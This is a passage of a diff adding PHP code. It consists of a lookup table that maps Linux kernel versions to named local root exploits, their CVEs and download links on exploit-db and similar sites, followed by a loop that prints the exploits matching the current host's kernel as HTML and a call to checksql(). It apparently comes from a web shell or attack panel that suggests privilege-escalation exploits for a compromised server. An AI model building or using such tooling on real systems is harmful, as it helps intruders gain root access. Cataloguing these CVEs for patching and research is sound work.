+array('2.6.3', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
+array('2.6.30', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'ptrace_kmod2', 'ia32syscall,robert_you_suck' , 'CVE-2010-3301' , 'http://www.exploit-db.com/exploits/15023/', 'rds', 'CVE-2010-3904' , 'http://www.exploit-db.com/exploits/15285/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
+array('2.6.31', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'ptrace_kmod2', 'ia32syscall,robert_you_suck' , 'CVE-2010-3301' , 'http://www.exploit-db.com/exploits/15023/', 'rawmodePTY', 'CVE-2014-0196' , 'http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c', 'rds', 'CVE-2010-3904' , 'http://www.exploit-db.com/exploits/15285/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
+array('2.6.32', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'ptrace_kmod2', 'ia32syscall,robert_you_suck' , 'CVE-2010-3301' , 'http://www.exploit-db.com/exploits/15023/', 'rawmodePTY', 'CVE-2014-0196' , 'http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c', 'rds', 'CVE-2010-3904' , 'http://www.exploit-db.com/exploits/15285/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
+array('2.6.33', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'ptrace_kmod2', 'ia32syscall,robert_you_suck' , 'CVE-2010-3301' , 'http://www.exploit-db.com/exploits/15023/', 'rawmodePTY', 'CVE-2014-0196' , 'http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c', 'rds', 'CVE-2010-3904' , 'http://www.exploit-db.com/exploits/15285/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
+array('2.6.34', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'caps_to_root', 'CVE-n/a' , 'http://www.exploit-db.com/exploits/15916/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'ptrace_kmod2', 'ia32syscall,robert_you_suck' , 'CVE-2010-3301' , 'http://www.exploit-db.com/exploits/15023/', 'rawmodePTY', 'CVE-2014-0196' , 'http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c', 'rds', 'CVE-2010-3904' , 'http://www.exploit-db.com/exploits/15285/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/'),
+array('2.6.35', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'caps_to_root', 'CVE-n/a' , 'http://www.exploit-db.com/exploits/15916/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'rawmodePTY', 'CVE-2014-0196' , 'http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c', 'rds', 'CVE-2010-3904' , 'http://www.exploit-db.com/exploits/15285/'),
+array('2.6.36', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'caps_to_root', 'CVE-n/a' , 'http://www.exploit-db.com/exploits/15916/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'rawmodePTY', 'CVE-2014-0196' , 'http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c', 'rds', 'CVE-2010-3904' , 'http://www.exploit-db.com/exploits/15285/'),
+array('2.6.37', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'rawmodePTY', 'CVE-2014-0196' , 'http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c', 'semtex', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/25444/‎'),
+array('2.6.38', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'rawmodePTY', 'CVE-2014-0196' , 'http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c', 'semtex', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/25444/‎'),
+array('2.6.39', 'memodipper', 'CVE-2012-0056' , 'http://www.exploit-db.com/exploits/18411/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'rawmodePTY', 'CVE-2014-0196' , 'http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c', 'semtex', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/25444/‎'),
+array('2.6.4', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
+array('2.6.5', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'krad', 'krad3', 'http://exploit-db.com/exploits/1397', 'ong_bak', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
+array('2.6.6', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
+array('2.6.7', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'krad', 'krad3', 'http://exploit-db.com/exploits/1397', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
+array('2.6.8', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'h00lyshit', 'CVE-2006-3626' , 'http://www.exploit-db.com/exploits/2013/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'krad', 'krad3', 'http://exploit-db.com/exploits/1397', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
+array('2.6.9', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'exp.sh', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'krad', 'krad3', 'http://exploit-db.com/exploits/1397', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'py2', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
+array('3.0.0', 'memodipper', 'CVE-2012-0056' , 'http://www.exploit-db.com/exploits/18411/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'semtex', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/25444/‎'),
+array('3.0.1', 'memodipper', 'CVE-2012-0056' , 'http://www.exploit-db.com/exploits/18411/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'semtex', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/25444/‎'),
+array('3.0.2', 'memodipper', 'CVE-2012-0056' , 'http://www.exploit-db.com/exploits/18411/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'semtex', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/25444/‎'),
+array('3.0.3', 'memodipper', 'CVE-2012-0056' , 'http://www.exploit-db.com/exploits/18411/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'semtex', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/25444/‎'),
+array('3.0.4', 'memodipper', 'CVE-2012-0056' , 'http://www.exploit-db.com/exploits/18411/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'semtex', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/25444/‎'),
+array('3.0.5', 'memodipper', 'CVE-2012-0056' , 'http://www.exploit-db.com/exploits/18411/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'semtex', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/25444/‎'),
+array('3.0.6', 'memodipper', 'CVE-2012-0056' , 'http://www.exploit-db.com/exploits/18411/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'semtex', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/25444/‎'),
+array('3.1.0', 'memodipper', 'CVE-2012-0056' , 'http://www.exploit-db.com/exploits/18411/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'semtex', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/25444/‎'),
+array('3.2', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
+array('3.3', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
+array('3.4', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
+array('3.4.0', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
+array('3.4.1', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
+array('3.4.2', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
+array('3.4.3', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
+array('3.4.4', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
+array('3.4.5', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
+array('3.4.6', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
+array('3.4.8', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
+array('3.4.9', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
+array('3.5', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
+array('3.5.0', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
+array('3.6', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
+array('3.6.0', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
+array('3.7', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
+array('3.7.0', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
+array('3.7.6', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/'),
+array('3.8', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
+array('3.8.0', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
+array('3.8.1', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
+array('3.8.2', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
+array('3.8.3', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
+array('3.8.4', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
+array('3.8.5', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
+array('3.8.6', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
+array('3.8.7', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
+array('3.8.8', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131'),
+array('3.8.9', 'perf_swevent', 'CVE-2013-2094' , 'http://www.exploit-db.com/download/26131', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
+array('3.9', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
+array('3.9.0', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/'),
+array('3.9.6', 'timeoutpwn', 'CVE-2014-0038' , 'http://www.exploit-db.com/exploits/31346/')
+);
+
+foreach($exploits as $exploit) {
+    if($exploit[0] == $kernel) {
+        echo 'Informations: <br />';
+            foreach($exploit as $ex) {
+                echo ' - '.$ex.'<br />';
+            }
+    }
+}
+
+}
+
+//Startups
+
+checksql();
+
 ?>
